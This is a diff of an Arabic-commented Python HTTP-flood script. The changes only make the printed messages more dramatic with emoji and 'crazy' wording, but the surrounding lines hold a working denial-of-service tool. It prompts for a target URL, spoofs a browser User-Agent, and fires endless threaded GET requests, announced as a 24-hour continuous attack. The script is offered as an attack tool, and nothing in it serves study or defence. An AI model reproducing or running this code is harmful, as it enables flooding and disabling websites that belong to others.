@@ -10,7 +10,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 fake_ip = '182.21.20.32'
 
 headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, مثل Gecko) Chrome/91.0.4472.124 Safari/537.36'
 }
 
 # إنشاء جلسة واحدة للاستخدام المتكرر
@@ -21,9 +21,9 @@ def attack(url):
     while True:
         try:
             response = session.get(url, headers=headers)
-            print("تم إرسال الطلب إلى:", url)
+            print("🚀🚀🚀 تم إطلاق صاروخ طلب إلى:", url)
         except Exception as e:
-            print("حدث خطأ:", e)
+            print("💥💥💥 أوه لا! حدث خطأ مجنون:", e)
 
 def start_attack(url):
     with ThreadPoolExecutor() as executor:
@@ -33,13 +33,13 @@ def start_attack(url):
     # الطلب الأولي خارج الهجمات
     try:
         response = session.get(url, headers=headers)
-        print(response.text)
+        print("🔥🔥🔥 النتيجة الأولية:", response.text)
     except Exception as e:
-        print("حدث خطأ أثناء الطلب الأولي:", e)
+        print("💥💥💥 خطأ أولي مجنون:", e)
 
-url = input("أدخل رابط الهدف: ")
+url = input("🎯 أدخل رابط الهدف المجنون: ")
 
-print("بدء الهجوم بشكل مستمر على مدار 24 ساعة")
+print("💣💣💣 بدء الهجوم المجنون بشكل مستمر على مدار 24 ساعة 💣💣💣")
 
 while True:
     start_attack(url)
